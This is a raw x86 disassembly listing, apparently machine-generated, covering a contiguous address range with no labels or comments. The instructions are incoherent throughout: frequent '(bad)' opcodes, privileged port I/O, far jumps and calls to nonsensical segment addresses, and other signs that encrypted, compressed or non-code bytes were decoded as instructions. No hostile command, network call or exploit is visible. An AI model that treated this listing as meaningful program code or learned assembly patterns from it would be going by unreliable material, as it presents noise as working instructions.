  421868:	sub    ecx,edi
  42186a:	int3   
  42186b:	pop    esp
  42186c:	or     eax,0x4beb4cae
  421871:	cmp    ebp,DWORD PTR [edx+0x4143773b]
  421877:	out    0x73,al
  421879:	lock or al,0x66
  42187c:	xchg   BYTE PTR [edx-0x68],al
  42187f:	aam    0x2b
  421881:	ror    BYTE PTR [edx],1
  421883:	and    esp,ecx
  421885:	push   esi
  421886:	cs pop ss
  421888:	lods   al,BYTE PTR ds:[esi]
  421889:	pop    ss
  42188a:	xor    edx,DWORD PTR [esi]
  42188c:	dec    esi
  42188d:	pop    eax
  42188e:	jno    0x421833
  421890:	or     edx,DWORD PTR [ecx]
  421892:	lods   eax,DWORD PTR ds:[esi]
  421893:	mov    eax,ds:0x82223514
  421898:	pop    ebp
  421899:	xor    BYTE PTR [edx],ah
  42189b:	xor    ah,BYTE PTR [eax-0x32bfd5f8]
  4218a1:	mov    ds:0xea6c3af9,eax
  4218a6:	jo     0x4218cc
  4218a8:	ins    BYTE PTR es:[edi],dx
  4218a9:	lods   al,BYTE PTR ds:[esi]
  4218aa:	mov    ch,0x1b
  4218ac:	jg     0x4218f8
  4218ae:	mov    ecx,0x754b33fd
  4218b3:	frstor [eax-0x141dda2d]
  4218b9:	jae    0x4218ab
  4218bb:	out    0x1a,eax
  4218bd:	movaps xmm4,XMMWORD PTR ds:0x1ef0219f
  4218c4:	sbb    bh,BYTE PTR [edx+0x5f]
  4218c7:	mov    dh,bl
  4218c9:	icebp  
  4218ca:	(bad)  
  4218cb:	aas    
  4218cc:	xchg   edx,eax
  4218cd:	les    eax,FWORD PTR [esi+edi*1]
  4218d0:	(bad)  
  4218d1:	push   ebx
  4218d2:	pop    esp
  4218d3:	mov    ds,WORD PTR [ecx-0x1]
  4218d6:	adc    DWORD PTR [ebx-0x533079a5],edx
  4218dc:	fs mov bl,0xa1
  4218df:	(bad)
  4218e3:	sbb    al,0x99
  4218e5:	sbb    al,0xe4
  4218e7:	out    dx,al
  4218e8:	ins    DWORD PTR es:[edi],dx
  4218e9:	shr    DWORD PTR [edx+0x79a91f26],cl
  4218ef:	xchg   ecx,eax
  4218f0:	arpl   WORD PTR [ebx+0x67b3e2d9],ax
  4218f6:	dec    ecx
  4218f7:	mov    ah,0xf8
  4218f9:	mov    ch,0x3c
  4218fb:	or     ebp,DWORD PTR [ecx]
  4218fd:	fsubr  DWORD PTR [ebx-0x1c7b8c10]
  421903:	ds sub eax,0x3ab6b621
  421909:	leave  
  42190a:	cli    
  42190b:	es mov esi,0x2cca5c84
  421911:	and    al,bl
  421913:	adc    eax,0xb2db1e19
  421918:	jmp    0x4218c0
  42191a:	cmp    bh,dh
  42191c:	es or  esp,0x860ac355
  421923:	outs   dx,BYTE PTR ds:[esi]
  421924:	inc    ecx
  421925:	imul   esi,DWORD PTR [ecx+0x7f],0x587ec865
  42192c:	jb     0x421996
  42192e:	out    dx,eax
  42192f:	add    DWORD PTR [edi+ebp*2+0x69],edx
  421933:	dec    edx
  421934:	mov    edi,0xad483a12
  421939:	cmp    ch,BYTE PTR [ecx+0x5e]
  42193c:	daa    
  42193d:	inc    ecx
  42193e:	mov    DWORD PTR [ebx],ecx
  421940:	test   eax,0x9fb2e17d
  421945:	pop    esi
  421946:	or     BYTE PTR [ebx],ah
  421948:	shl    BYTE PTR [ecx*4-0x79ae55ae],1
  42194f:	cmp    dl,BYTE PTR [ecx+0x55e683dc]
  421955:	cs mov esi,0x6d4124ce
  42195b:	dec    esi
  42195c:	rcr    DWORD PTR [esi],cl
  42195e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42195f:	push   cs
  421960:	pop    eax
  421961:	jne    0x4218ed
  421963:	cwde   
  421964:	lds    esp,FWORD PTR [edi+0x1e62f152]
  42196a:	pop    es
  42196b:	or     eax,0x7442200b
  421971:	pop    es
  421972:	adc    eax,0x3d7f498c
  421977:	jno    0x421967
  421979:	rol    DWORD PTR [eax-0x30],1
  42197c:	pop    ss
  42197d:	(bad)  
  42197e:	jp     0x421924
  421980:	loop   0x42198f
  421982:	(bad)  
  421983:	adc    BYTE PTR [ebp-0xaa73801],bh
  421989:	hlt    
  42198a:	or     bh,BYTE PTR [ecx-0x43]
  42198d:	ss adc al,0xcb
  421990:	mov    edi,DWORD PTR [edx-0x3c]
  421993:	adc    bh,BYTE PTR [edi]
  421995:	sub    eax,0xfa95b972
  42199a:	clc    
  42199b:	lods   al,BYTE PTR ds:[esi]
  42199c:	hlt    
  42199d:	cmc    
  42199e:	ret    
  42199f:	ins    DWORD PTR es:[edi],dx
  4219a0:	lea    ecx,ds:0x358de88b
  4219a6:	pop    esp
  4219a7:	adc    DWORD PTR [ecx+edi*2-0x42],eax
  4219ab:	jno    0x421983
  4219ad:	cmp    eax,DWORD PTR [ebp-0x1a4d4675]
  4219b3:	mov    cl,0x59
  4219b5:	int    0x60
  4219b7:	jg     0x42198d
  4219b9:	in     eax,0x9a
  4219bb:	or     edx,esp
  4219bd:	add    eax,0xd6a6a409
  4219c2:	dec    edx
  4219c3:	mov    ss,WORD PTR [edx-0x20]
  4219c6:	jecxz  0x421a2b
  4219c8:	or     DWORD PTR [edx+0x41ec9641],ebp
  4219ce:	mov    dl,0xff
  4219d0:	mov    DWORD PTR [edx],ecx
  4219d2:	rcl    DWORD PTR [eax+ebx*1],0x5b
  4219d6:	in     eax,0xc4
  4219d8:	aad    0x8c
  4219da:	pop    ebx
  4219db:	xchg   ebp,eax
  4219dc:	push   ebp
  4219dd:	push   esp
  4219de:	data16 jge 0x421a58
  4219e1:	jp     0x4219f6
  4219e3:	and    BYTE PTR [ebx],cl
  4219e5:	loop   0x421a2b
  4219e7:	sahf   
  4219e8:	sub    al,0x84
  4219ea:	jmp    0x4219ab
  4219ec:	xor    al,0x3a
  4219ee:	cld    
  4219ef:	xchg   esp,esi
  4219f1:	fld    QWORD PTR [edx-0xaa87fc5]
  4219f7:	inc    esi
  4219f8:	push   ds
  4219f9:	enter  0x151d,0x2b
  4219fd:	js     0x42199d
  4219ff:	jb     0x421a32
  421a01:	add    al,0xd
  421a03:	shr    dh,cl
  421a05:	sbb    DWORD PTR [esi],ebx
  421a07:	and    ecx,DWORD PTR [edx]
  421a09:	xchg   esi,eax
  421a0a:	aas    
  421a0b:	inc    ecx
  421a0c:	xor    eax,0x8cf13972
  421a11:	adc    ebx,DWORD PTR ds:0x2c101f7f
  421a17:	push   edi
  421a18:	adc    BYTE PTR [edx+0x638a8c73],0xba
  421a1f:	ins    BYTE PTR es:[edi],dx
  421a20:	or     BYTE PTR [eax+0x22b3d798],bl
  421a26:	xor    eax,0x7cfadc28
  421a2b:	out    dx,al
  421a2c:	fistp  DWORD PTR [esi+0x3a236b44]
  421a32:	out    dx,al
  421a33:	fdivp  st(7),st
  421a35:	sti    
  421a36:	or     esi,ebp
  421a38:	imul   ecx,eax,0xffffffe7
  421a3b:	cmp    al,0xe5
  421a3e:	(bad)  
  421a3f:	xchg   ecx,eax
  421a40:	dec    esp
  421a41:	addr16 inc ebp
  421a43:	scas   eax,DWORD PTR es:[edi]
  421a44:	aaa    
  421a45:	xchg   edi,edi
  421a47:	pop    edi
  421a48:	ins    DWORD PTR es:[edi],dx
  421a49:	dec    eax
  421a4a:	fcom   DWORD PTR [edi]
  421a4c:	add    bl,BYTE PTR [ebp+0x7c]
  421a4f:	aad    0x77
  421a51:	and    BYTE PTR [edx+0x41],dh
  421a54:	fsubr  QWORD PTR [eax+0x5d]
  421a57:	dec    ecx
  421a58:	arpl   WORD PTR [ebp-0x49],dx
  421a5b:	ins    DWORD PTR es:[edi],dx
  421a5c:	pop    ss
  421a5d:	mov    al,ds:0x8b1ec88c
  421a62:	mov    esp,0x35f24943
  421a67:	mov    DWORD PTR [ecx],ecx
  421a69:	loop   0x421aa4
  421a6b:	jmp    0xa309:0x92ff181f
  421a72:	out    0xf6,al
  421a74:	xchg   ebp,eax
  421a75:	repz cli 
  421a77:	adc    al,0x1e
  421a79:	pop    ebp
  421a7a:	jl     0x421a1a
  421a7c:	test   al,0x16
  421a7e:	bound  edi,QWORD PTR [edx+0x5ced86e6]
  421a84:	cmp    eax,0x43634efb
  421a89:	es js  0x421a41
  421a8c:	mov    ebp,es
  421a8e:	and    ecx,DWORD PTR [ebx-0x32a352ba]
  421a94:	or     edx,DWORD PTR [ebx-0x5b]
  421a97:	rol    DWORD PTR [edi+0x6d396ef4],0x1e
  421a9e:	adc    ah,0xd9
  421aa1:	inc    edi
  421aa2:	jge    0x421af5
  421aa4:	lea    edx,[edx+eiz*2]
  421aa7:	je     0x421b12
  421aa9:	cmp    ebx,DWORD PTR [esi-0x28778148]
  421aaf:	jnp    0x421ade
  421ab1:	in     al,0x58
  421ab3:	mov    eax,0x78e9538b
  421ab8:	xor    eax,0xf1fa12a8
  421abd:	jo     0x421b16
  421abf:	mov    ebp,0x8ac304b6
  421ac4:	les    edx,FWORD PTR [esi+ecx*1+0x7c]
  421ac8:	sar    DWORD PTR [edi],1
  421aca:	push   esi
  421acb:	aas    
  421acc:	arpl   WORD PTR [ebp-0x3f],di
  421acf:	pop    ds
  421ad0:	inc    ebx
  421ad1:	mov    eax,ds:0xb6b35602
  421ad6:	mov    al,0xbb
  421ad8:	call   0x862b9d28
  421add:	icebp  
  421ade:	push   0xd431d523
  421ae3:	dec    ebx
  421ae4:	pushf  
  421ae5:	add    DWORD PTR [ecx],esi
  421ae7:	stos   DWORD PTR es:[edi],eax
  421ae8:	clc    
  421ae9:	call   0xc0788b8f
  421aee:	push   ds
  421aef:	rol    BYTE PTR [edi],0x8b
  421af2:	sbb    dh,BYTE PTR [edi-0xe]
  421af5:	jl     0x421b49
  421af7:	xor    al,0x36
  421af9:	push   es
  421afa:	out    dx,al
  421afb:	pop    ss
  421afc:	dec    ebp
  421afd:	fnstcw WORD PTR [ebx+0x7d26a736]
  421b03:	mov    al,ds:0x63100de6
  421b08:	fnsetpm(287 only) 
  421b0a:	or     al,0x7a
  421b0c:	add    BYTE PTR [edi+0x3bd7c8c8],bh
  421b12:	add    al,0x12
  421b14:	idiv   dh
  421b16:	test   eax,0x8db6d5ed
  421b1b:	iret   
  421b1c:	inc    eax
  421b1d:	sub    edx,DWORD PTR [ecx]
  421b1f:	ret    
  421b20:	sub    esp,DWORD PTR [ebx+0x4a6f7551]
  421b26:	outs   dx,BYTE PTR ds:[esi]
  421b27:	cmp    eax,0x2351f92f
  421b2c:	jne    0x421b9b
  421b2e:	and    eax,0x97a19a07
  421b33:	mov    cl,0x49
  421b35:	out    dx,al
  421b36:	push   ds
  421b37:	out    0x19,al
  421b39:	xor    al,0x3e
  421b3b:	imul   ecx,DWORD PTR [edx+0x3897abbd],0x6d
  421b42:	inc    edx
  421b43:	rcl    ah,cl
  421b45:	pop    esi
  421b46:	mov    edi,0xa78c9106
  421b4b:	das    
  421b4c:	cli    
  421b4d:	xor    eax,DWORD PTR [esp+eax*4+0x4d673915]
  421b54:	test   ebx,ecx
  421b56:	mov    eax,0xc232bfe3
  421b5b:	sub    ah,BYTE PTR [esi+ebp*1+0x13cd63b8]
  421b62:	xor    ebx,DWORD PTR [ebx+esi*8-0x7820edd5]
  421b69:	add    dl,BYTE PTR [esi]
  421b6b:	daa    
  421b6c:	adc    eax,eax
  421b6e:	jg     0x421ba8
  421b70:	mov    eax,0xd0a6a2a9
  421b75:	or     ecx,0x3f
  421b78:	enter  0x7eac,0x3e
  421b7c:	jmp    0xe549f049
  421b81:	addr16 add al,0x2c
  421b84:	sbb    dl,BYTE PTR [ecx]
  421b86:	xchg   BYTE PTR [eax],ah
  421b88:	fcomp  QWORD PTR [eax+0x58]
  421b8b:	pop    ebx
  421b8c:	sbb    eax,DWORD PTR [ecx]
  421b8e:	dec    esi
  421b8f:	add    BYTE PTR [esi+esi*2+0x3b3f858f],0x9f
  421b97:	(bad)  
  421b98:	in     eax,dx
  421b99:	sub    al,0xca
  421b9b:	imul   ebx,DWORD PTR [esi]
  421b9e:	sbb    DWORD PTR [ebp-0x58855517],edx
  421ba4:	jae    0x421c20
  421ba6:	ror    BYTE PTR [edi+esi*4-0x42007f4c],1
  421bad:	rol    BYTE PTR [eax-0x504e20ae],0x19
  421bb4:	xor    BYTE PTR [eax-0x5a741ab9],al
  421bba:	and    eax,0xebe89245
  421bbf:	adc    eax,0x9f1e802
  421bc4:	inc    esi
  421bc5:	adc    al,0x28
  421bc7:	cmp    eax,0xdffcf3ce
  421bcc:	and    BYTE PTR [eax-0x62],bh
  421bcf:	out    dx,eax
  421bd0:	and    DWORD PTR [ebp-0x2e90609c],edi
  421bd6:	add    al,0x2a
  421bd8:	inc    edi
  421bd9:	fnstenv [edx+0x60d079fe]
  421bdf:	dec    eax
  421be0:	push   esp
  421be1:	sub    BYTE PTR [ebp+ebx*1+0x67],bh
  421be5:	inc    edi
  421be6:	fadd   st,st(1)
  421be8:	sub    eax,0x79e94d40
  421bed:	repnz sub ah,BYTE PTR cs:[ecx]
  421bf1:	jne    0x421bf4
  421bf3:	clc    
  421bf4:	into   
  421bf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421bf6:	cwde   
  421bf7:	push   eax
  421bf8:	push   ebp
  421bf9:	faddp  st(0),st
  421bfb:	xor    dh,cl
  421bfd:	mov    DWORD PTR [edx+0x44433a56],0x0
  421c07:	add    BYTE PTR [eax],al
  421c09:	add    BYTE PTR [esi+0x43],dl
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx-0x130a168e]
  421c18:	adc    eax,0x1aad74d
  421c1d:	add    BYTE PTR [ecx+0x6b000006],al
  421c23:	aad    0x24
  421c25:	aaa    
  421c26:	inc    edx
  421c27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c28:	faddp  st(3),st
  421c2a:	dec    edx
  421c2b:	mov    esp,es
  421c2d:	mov    bl,0x61
  421c2f:	xchg   DWORD PTR [eax+0x21e5ed7b],eax
  421c35:	lahf   
  421c36:	cli    
  421c37:	cwde   
  421c38:	and    eax,0x12988cdd
  421c3d:	imul   BYTE PTR [ecx*8+0x375ce176]
  421c44:	xchg   esp,eax
  421c45:	loope  0x421bcf
  421c47:	and    BYTE PTR [ebx],bh
  421c49:	fidiv  WORD PTR [eax+0x61]
  421c4c:	lea    ebp,ds:0xa27e8a63
  421c52:	pushw  ds
  421c54:	outs   dx,DWORD PTR ds:[esi]
  421c55:	es in  eax,0x13
  421c58:	xchg   edx,eax
  421c59:	into   
  421c5a:	sbb    al,0x70
  421c5c:	in     eax,0x45
  421c5e:	xchg   esp,eax
  421c5f:	or     eax,DWORD PTR [eax]
  421c61:	pop    eax
  421c62:	cli    
  421c63:	cdq    
  421c64:	lds    esp,FWORD PTR ds:0xb9435c86
  421c6a:	pusha  
  421c6b:	dec    edi
  421c6c:	sub    DWORD PTR [eax+0x41992988],eax
  421c72:	(bad)  
  421c73:	mov    bl,0x62
  421c75:	scas   eax,DWORD PTR es:[edi]
  421c76:	dec    ebp
  421c77:	cmp    BYTE PTR [edi+0x4d],al
  421c7a:	push   esi
  421c7b:	(bad)  
  421c7c:	(bad)  
  421c7e:	or     al,BYTE PTR gs:[edx]
  421c81:	dec    ebx
  421c82:	xchg   esi,eax
  421c83:	mov    bh,0xec
  421c85:	adc    eax,0x8942b3ae
  421c8a:	push   ecx
  421c8b:	xor    BYTE PTR [esi],dh
  421c8d:	sahf   
  421c8e:	lods   eax,DWORD PTR ss:[esi]
  421c90:	xchg   ebx,eax
  421c91:	pushf  
  421c92:	pop    edi
  421c93:	jge    0x421cc4
  421c95:	or     DWORD PTR es:0xcdbfb809,edx
  421c9c:	test   ch,cl
  421c9e:	in     al,dx
  421c9f:	fwait
  421ca0:	daa    
  421ca1:	pop    es
  421ca2:	sub    cl,bl
  421ca4:	fisttp WORD PTR [ebx+0x3b]
  421ca7:	(bad)  
  421ca8:	clc    
  421ca9:	pushf  
  421caa:	cmp    DWORD PTR [edx+0x30262f53],esi
  421cb0:	xor    al,0xd1
  421cb2:	dec    ebx
  421cb3:	adc    bl,ch
  421cb5:	adc    BYTE PTR [edx+eiz*2+0x3477daa2],bl
  421cbc:	test   eax,0xbc4a5577
  421cc1:	push   es
  421cc2:	rcr    ch,cl
  421cc4:	or     dh,BYTE PTR [edi+eax*8-0x3a7c2ca]
  421ccb:	lahf   
  421ccc:	push   eax
  421ccd:	imul   eax,DWORD PTR [esi+0x7a],0x89a23dbb
  421cd4:	lods   al,BYTE PTR ds:[esi]
  421cd5:	mov    ah,0x99
  421cd7:	mov    eax,ds:0xa37f15b7
  421cdc:	or     ch,0xc5
  421cdf:	push   ss
  421ce0:	pop    ss
  421ce1:	dec    esp
  421ce2:	xchg   ebp,eax
  421ce3:	cdq    
  421ce4:	xchg   edi,eax
  421ce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ce6:	and    ecx,edx
  421ce8:	push   cs
  421ce9:	jl     0x421cfc
  421ceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421cec:	repz inc esp
  421cee:	call   0xd852:0x8ea2dae7
  421cf5:	jne    0x421d03
  421cf7:	int3   
  421cf8:	pop    esp
  421cf9:	or     BYTE PTR [ebx+eiz*4],dh
  421cfc:	sub    BYTE PTR [edx-0x6f792260],dh
  421d02:	or     BYTE PTR [esi+edi*1-0x55],bh
  421d06:	dec    edx
  421d07:	xchg   BYTE PTR ds:0x454b7e64,dl
  421d0d:	js     0x421d52
  421d0f:	scas   al,BYTE PTR es:[edi]
  421d10:	mov    edx,0x2145e0e4
  421d15:	add    bh,ch
  421d17:	das    
  421d18:	shl    BYTE PTR [ecx],cl
  421d1a:	jne    0x421cc6
  421d1c:	fistp  QWORD PTR [ecx+0x12]
  421d1f:	pop    eax
  421d20:	push   es
  421d21:	(bad)  
  421d22:	loope  0x421d28
  421d24:	adc    BYTE PTR [eax],0x70
  421d27:	outs   dx,DWORD PTR ds:[esi]
  421d28:	sub    eax,0x1030b71
  421d2d:	or     cl,BYTE PTR [edi-0x31301f4e]
  421d33:	js     0x421d22
  421d35:	ds enter 0x7f59,0x13
  421d3a:	mov    ecx,0xb5607bc9
  421d3f:	lods   al,BYTE PTR ds:[esi]
  421d40:	popf   
  421d41:	mov    esp,0x4a61120a
  421d46:	or     DWORD PTR [eax-0x43de3f73],ebx
  421d4c:	ss jmp 0x1e7bcf47
  421d52:	add    DWORD PTR [ebx-0x9],esi
  421d55:	mov    dl,dh
  421d57:	ds js  0x421d24
  421d5a:	jg     0x421d8c
  421d5c:	cmp    DWORD PTR [eax+0x18],0x5cab8e41
  421d63:	or     DWORD PTR [eax],edi
  421d65:	inc    esi
  421d66:	xchg   BYTE PTR ds:0xe70f6ef2,cl
  421d6c:	adc    eax,0x583408a7
  421d71:	jmp    FWORD PTR [ebx]
  421d73:	test   eax,0x8c14e4ed
  421d78:	(bad)  ds:0xbc730a6b
  421d7e:	cmc    
  421d7f:	pop    ecx
  421d80:	gs sub al,0xec
  421d83:	jg     0x421df9
  421d85:	and    ebp,DWORD PTR [ebx+eiz*2+0x74596b3a]
  421d8c:	setae  ch
  421d8f:	mov    BYTE PTR [esi+0x2a],dl
  421d92:	mov    BYTE PTR [ebp-0x63c1c673],ah
  421d98:	dec    edx
  421d99:	in     eax,0x70
  421d9b:	dec    ebx
  421d9c:	or     al,BYTE PTR [ebx+edi*1+0x73]
  421da0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421da1:	loope  0x421db5
  421da3:	xchg   esp,eax
  421da4:	xor    al,0xce
  421da6:	jmp    0x56d1:0x47c945a9
  421dad:	and    BYTE PTR [esi],al
  421daf:	jge    0x421d7d
  421db1:	xchg   ecx,eax
  421db2:	ror    ecx,1
  421db4:	cli    
  421db5:	(bad)  
  421db6:	shr    dl,cl
  421db8:	inc    ebx
  421db9:	fadd   DWORD PTR [ebx+0x189a51ff]
  421dbf:	int    0x50
  421dc1:	dec    ecx
  421dc2:	retf   
  421dc3:	out    0x7e,eax
  421dc5:	add    eax,0x2168ee71
  421dca:	in     eax,dx
  421dcb:	pop    eax
  421dcc:	mov    bl,0xbf
  421dce:	int3   
  421dcf:	xchg   ebp,eax
  421dd0:	int3   
  421dd1:	jno    0x421e30
  421dd3:	push   eax
  421dd4:	pop    es
  421dd5:	sbb    edi,DWORD PTR [eax]
  421dd7:	or     ah,cl
  421dd9:	sbb    dl,bl
  421ddb:	ja     0x421d98
  421ddd:	dec    edi
  421dde:	ins    DWORD PTR es:[edi],dx
  421ddf:	call   0x5723d801
  421de4:	sub    al,0x83
  421de6:	sbb    DWORD PTR gs:[edx],edi
  421de9:	jno    0x421e06
  421deb:	inc    edx
  421dec:	mov    ah,ah
  421dee:	mov    dl,0x11
  421df0:	pop    ebp
  421df1:	fcomp  DWORD PTR [ebp+0x3c]
  421df4:	fwait
  421df5:	(bad)  
  421df6:	mov    ah,0xf
  421df8:	retf   0xb3b4
  421dfb:	jmp    0x4489:0x5edb2543
  421e02:	in     eax,0xd7
  421e04:	and    eax,0xd9331899
  421e09:	stos   DWORD PTR es:[edi],eax
  421e0a:	inc    esp
  421e0b:	and    edx,0xffffffd2
  421e0e:	push   ebp
  421e0f:	mov    al,bh
  421e11:	xlat   BYTE PTR ds:[ebx]
  421e12:	xor    eax,0xe3858abf
  421e17:	retf   
  421e18:	lock sbb edx,DWORD PTR [ebx]
  421e1b:	(bad)  
  421e1c:	ins    DWORD PTR es:[edi],dx
  421e1d:	jnp    0x421e1f
  421e1f:	xchg   edi,eax
  421e20:	cmp    esi,DWORD PTR [esi]
  421e22:	or     eax,0x19aa87c4
  421e27:	push   ss
  421e28:	mov    esp,0x2e3b69dd
  421e2d:	ffree  st(1)
  421e2f:	push   esp
  421e30:	ds cs mov ecx,0x97fe0ddd
  421e37:	mov    ah,BYTE PTR [ebx]
  421e39:	pop    edx
  421e3a:	in     eax,dx
  421e3b:	je     0x421e5a
  421e3d:	mov    edx,0x555f483f
  421e42:	push   ds
  421e43:	stos   DWORD PTR es:[edi],eax
  421e44:	test   eax,0x89184422
  421e49:	jmp    0x421e8d
  421e4b:	add    esi,DWORD PTR [edi-0x7d]
  421e4e:	aam    0xce
  421e50:	fbld   TBYTE PTR [ecx-0x10a62ad6]
  421e56:	cmp    eax,0xaf01a125
  421e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e5c:	cdq    
  421e5d:	sub    DWORD PTR [eax+0x205fa03d],0x12
  421e64:	mov    ecx,esi
  421e66:	mov    ebp,0x36a1def
  421e6b:	mov    ebp,0xbcbfb910
  421e70:	push   ecx
  421e71:	xor    al,0x7b
  421e73:	mov    bh,0x2
  421e75:	add    al,0xb5
  421e77:	cmp    bl,ch
  421e79:	fwait
  421e7a:	jnp    0x421e44
  421e7c:	(bad)  
  421e7d:	fcmovu st,st(7)
  421e7f:	rcl    BYTE PTR [ecx+0x2f],cl
  421e82:	stc    
  421e83:	popa   
  421e84:	sub    BYTE PTR [ecx+0x5b6e402f],cl
  421e8a:	pop    edx
  421e8b:	test   esi,edx
  421e8d:	stc    
  421e8e:	push   es
  421e8f:	repnz sbb DWORD PTR [edx+0x9],0x23
  421e94:	adc    esi,DWORD PTR [edi]
  421e96:	push   es
  421e97:	dec    eax
  421e98:	jmp    0x421ee3
  421e9a:	ret    
  421e9b:	test   BYTE PTR [ecx],al
  421e9d:	jecxz  0x421e95
  421e9f:	std    
  421ea0:	or     al,BYTE PTR [eax+0x31f547e8]
  421ea6:	shl    BYTE PTR ds:0xe697ea62,cl
  421eac:	or     al,BYTE PTR [edx-0x3b81a0d6]
  421eb2:	out    dx,al
  421eb3:	dec    eax
  421eb4:	and    dl,BYTE PTR [ebp-0x5bd9c024]
  421eba:	mov    bl,0x26
  421ebc:	xchg   ebx,eax
  421ebd:	or     DWORD PTR [edx],edx
  421ebf:	cmp    BYTE PTR [ecx+eiz*2+0x4e],0x74
  421ec4:	push   eax
  421ec5:	inc    eax
  421ec6:	aad    0xa0
  421ec8:	push   0xffffffe5
  421eca:	pop    es
  421ecb:	ret    
  421ecc:	sbb    BYTE PTR [ebx+0x748ef2b5],0x96
  421ed3:	call   0xd65be729
  421ed8:	es ret 
  421eda:	lds    ecx,FWORD PTR [eax-0x47]
  421edd:	icebp  
  421ede:	sar    edx,1
  421ee0:	lea    eax,[esi-0x10b5606e]
  421ee6:	pushf  
  421ee7:	les    ebp,FWORD PTR [ecx-0x65167227]
  421eed:	dec    ecx
  421eee:	inc    eax
  421eef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ef0:	jmp    0x421f65
  421ef2:	sbb    BYTE PTR [ebp-0x2c],bl
  421ef5:	clc    
  421ef6:	inc    ebp
  421ef7:	mov    al,ds:0xe682c5a
  421efc:	les    edi,FWORD PTR [ecx]
  421efe:	dec    esi
  421eff:	daa    
  421f00:	pushf  
  421f01:	cdq    
  421f02:	in     eax,0xf4
  421f04:	xlat   BYTE PTR ds:[ebx]
  421f05:	mov    eax,ds:0x49bd586b
  421f0a:	sbb    ah,bh
  421f0c:	sub    eax,ebx
  421f0e:	out    dx,eax
  421f0f:	ds retf 
  421f11:	popa   
  421f12:	clc    
  421f13:	cmp    al,0x25
  421f15:	mov    dh,0x2f
  421f17:	dec    esp
  421f18:	sub    eax,0xdf41d545
  421f1d:	je     0x421ed8
  421f1f:	mov    edi,0xc3ce1752
  421f24:	pop    esi
  421f25:	jge    0x421eae
  421f27:	adc    al,0xb8
  421f29:	out    dx,eax
  421f2a:	push   cs
  421f2b:	(bad)  
  421f2d:	xchg   ch,cl
  421f2f:	addr16 mov ds:0x26b1,al
  421f33:	push   ss
  421f34:	add    eax,0x474abdae
  421f39:	or     al,0x99
  421f3c:	adc    BYTE PTR [edi-0x406c8448],ah
  421f42:	out    0x9a,al
  421f44:	imul   ebp,eax,0xffffffe6
  421f47:	(bad)
  421f4c:	or     al,0x16
  421f4e:	sub    eax,0xde139fb8
  421f53:	imul   esp,DWORD PTR [edx],0x32
  421f56:	jnp    0x421fa0
  421f58:	lods   eax,DWORD PTR ds:[esi]
  421f59:	jae    0x421f29
  421f5b:	xchg   esi,eax
  421f5c:	cmp    DWORD PTR [eax+ebx*1+0xf],0xf
  421f61:	mov    ah,al
  421f63:	test   eax,0x242c5b8
  421f68:	or     DWORD PTR ds:0x885dbe0e,ebp
  421f6e:	js     0x421f94
  421f70:	mov    ebx,0xcf32c58d
  421f75:	and    BYTE PTR [eax],dl
  421f77:	xor    eax,0xdd41a26a
  421f7c:	mov    ?,eax
  421f7e:	addr16 pop es
  421f80:	out    0xec,eax
  421f82:	aas    
  421f83:	les    edi,FWORD PTR [ebx-0x13b6559f]
  421f89:	mov    ebp,0x8d25c974
  421f8e:	pop    ebp
  421f8f:	lock rol BYTE PTR ss:[edx-0x34],cl
  421f94:	sub    cl,BYTE PTR [edi+0x4b0103a5]
  421f9a:	mov    ds:0x7c027b82,al
  421f9f:	fucom  st(3)
  421fa1:	xchg   ebx,eax
  421fa2:	cdq    
  421fa3:	repz cmp BYTE PTR [eax+0x68d388c6],bh
  421faa:	outs   dx,BYTE PTR ds:[esi]
  421fab:	fcmove st,st(2)
  421fad:	jp     0x421f65
  421faf:	scas   al,BYTE PTR es:[edi]
  421fb0:	jg     0x421fed
  421fb2:	add    BYTE PTR [esi+0x28fc5c6f],ch
  421fb8:	push   ss
  421fb9:	mov    dl,cl
  421fbb:	and    eax,0x9b0a51de
  421fc0:	cmp    eax,0x958efa30
  421fc5:	sbb    BYTE PTR [edi+0x63],dl
  421fc8:	call   0x971626cf
  421fcd:	test   BYTE PTR [esi+0x4865871b],dl
  421fd3:	loopne 0x421ff6
  421fd5:	sbb    ah,dl
  421fd7:	js     0x422021
  421fd9:	iret   
  421fda:	xlat   BYTE PTR gs:[ebx]
  421fdc:	mov    al,ds:0xff3b225d
  421fe1:	sub    al,0x29
  421fe3:	stos   DWORD PTR es:[edi],eax
  421fe4:	dec    ebp
  421fe5:	mov    ecx,0xd1873604
  421fea:	push   esp
  421feb:	push   edi
  421fec:	cmp    edi,esp
  421fee:	repz and DWORD PTR [ecx+0x65],0x69
  421ff3:	pop    es
  421ff4:	mov    ecx,edi
  421ff6:	loopne 0x42201f
  421ff8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ff9:	xchg   ecx,eax
  421ffa:	dec    esp
  421ffb:	int3   
  421ffc:	mov    esp,0xc89e2013
  422001:	pop    esi
  422002:	fsubr  QWORD PTR [eax]
  422004:	cld    
  422005:	push   0x3d92aef1
  42200a:	jl     0x42204c
  42200c:	scas   eax,DWORD PTR es:[edi]
  42200d:	inc    ecx
  42200e:	call   0x9ad2:0x5ad0b055
  422015:	mov    esp,0xae56bcbf
  42201a:	mov    ebp,0x7e03cfd4
  42201f:	cwde   
  422020:	jecxz  0x421fdc
  422022:	in     ax,dx
  422024:	retf   0x98ec
  422027:	xchg   ebp,eax
  422028:	xchg   ebx,eax
  422029:	aad    0xc9
  42202b:	xor    ch,al
  42202d:	cdq    
  42202e:	xor    eax,0x8e9d9320
  422033:	sbb    bh,dl
  422035:	adc    dl,bh
  422037:	pushf  
  422038:	pop    esi
  422039:	adc    eax,0x927f67d4
  42203e:	repz mov dh,0x6e
  422041:	out    0xc9,eax
  422043:	pop    ss
  422044:	jo     0x421fd7
  422046:	dec    ebx
  422047:	push   esp
  422048:	ror    DWORD PTR [edi],0x28
  42204b:	push   edi
  42204c:	lods   eax,DWORD PTR ds:[esi]
  42204d:	daa    
  42204e:	es pop ds
  422050:	or     BYTE PTR [ebx-0x5279e3e5],0xf0
